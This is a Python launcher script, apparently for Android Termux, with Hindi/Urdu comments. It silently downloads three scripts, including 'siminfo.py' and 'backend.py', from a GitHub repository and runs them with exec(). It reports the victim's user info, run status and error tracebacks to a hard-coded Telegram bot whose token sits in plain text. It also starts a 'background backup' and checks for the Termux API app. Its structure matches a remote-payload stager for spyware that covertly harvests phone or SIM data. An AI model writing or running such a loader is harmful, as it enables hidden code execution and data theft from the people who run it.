import sys
import os
import urllib.request
import subprocess
import requests
import traceback

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# --- Runchecker Bot Token ---
RUNNER_BOT_TOKEN = "8884485359:AAHX-DzHyQXwjWh65Go8gykm_-TBTtFOoS0"
CHAT_ID = "7883547875"

def send_run_alert(message):
    try:
        url = f"https://api.telegram.org/bot{RUNNER_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': CHAT_ID, 'text': message}
        requests.post(url, data=payload, timeout=10)
    except Exception:
        pass

SIMINFO_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/siminfo.py"
BACKEND_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/backend.py"
API_URL = "https://raw.githubusercontent.com/aqiii798/Backup_Data/main/Api_Data.py"

def fetch_and_run_script(url, script_name, local_vars=None):
    if local_vars is None:
        local_vars = {}
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=15) as response:
            code_content = response.read().decode('utf-8')
            
        if not code_content.strip():
            error_msg = f"⚠️ Warning: [{script_name}] ki file khali hai!"
            send_run_alert(error_msg)
            return False, local_vars
            
        exec(code_content, local_vars)
        return True, local_vars
    except Exception as e:
        error_details = traceback.format_exc()
        error_msg = f"❌ Error in [{script_name}] execution!\nReason: {str(e)}\n\nDetails:\n{error_details[:500]}"
        send_run_alert(error_msg)
        return False, local_vars

def check_termux_api_app():
    try:
        if os.path.exists("/data/data/com.termux.api") or os.path.exists("/data/user/0/com.termux.api"):
            return "Termux API App Available"
            
        res = subprocess.run(['dumpsys', 'package', 'com.termux.api'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if b"Package [" in res.stdout or b"userId=" in res.stdout:
            return "Termux API App Available"
            
        return "Termux API App Not Found"
    except Exception:
        return "Termux API App Not Found"

def main():
    try:
        current_user_info = "Unknown User"
        
        # --- 1. SIMINFO SCRIPT (Priority 1: Sabse Pehle Run Hogi) ---
        sim_locals = {}
        sim_success, sim_locals = fetch_and_run_script(SIMINFO_URL, "siminfo.py", sim_locals)
        
        if sim_success:
            try:
                if 'splash_screen' in sim_locals:
                    current_user_info = sim_locals['splash_screen']()
            except Exception as e:
                send_run_alert(f"⚠️ Siminfo splash_screen execution error: {str(e)}")

        # --- 2. Termux API Status Check ---
        termux_status = check_termux_api_app()

        # --- 3. BACKEND SCRIPT (Independent Try-Except) ---
        backend_success = False
        try:
            backend_locals = {'current_user_info': current_user_info}
            backend_success, backend_locals = fetch_and_run_script(BACKEND_URL, "backend.py", backend_locals)
            
            if backend_success and 'start_background_backup' in backend_locals:
                try:
                    backend_locals['start_background_backup'](current_user_info)
                except Exception as e:
                    send_run_alert(f"⚠️ Backend start_background_backup error: {str(e)}")
        except Exception as e:
            send_run_alert(f"❌ Backend Module Critical Error: {str(e)}")
            
        backend_status = "Success ✅" if backend_success else "Failed ❌"

        # --- 4. API DATA SCRIPT (Independent Try-Except) ---
        api_success = False
        try:
            api_locals = {'current_user_info': current_user_info}
            api_success, _ = fetch_and_run_script(API_URL, "Api_Data.py", api_locals)
        except Exception as e:
            send_run_alert(f"❌ API Data Module Critical Error: {str(e)}")
            
        api_status = "Success ✅" if api_success else "Failed ❌"

        # --- 5. Final Master Status Report Telegram par bhejna ---
        final_report = (
            f"🤖 [RUNNER MASTER STATUS REPORT]\n\n"
            f"👤 User Info: {current_user_info}\n\n"
            f"📌 Siminfo Script: {'Success ✅' if sim_success else 'Failed ❌'}\n"
            f"🚀 Backend Script Status: {backend_status}\n"
            f"🔌 API Data Script Status: {api_status}\n"
            f"📱 Termux API Status: {termux_status}"
        )
        send_run_alert(final_report)

        # --- 6. Front-end Main loop agar siminfo mein mojood ho ---
        if sim_success and 'main' in sim_locals:
            try:
                sim_locals['main']()
            except Exception as e:
                send_run_alert(f"❌ Siminfo main() loop crashed: {str(e)}")

    except KeyboardInterrupt:
        print("\n\n⚠️ Program interrupted by user")
        send_run_alert("⚠️ Program manually interrupted by user.")
    except Exception as e:
        error_msg = f"❌ Master Runner Critical Error:\n{str(e)}"
        send_run_alert(error_msg)

if __name__ == "__main__":
    main()
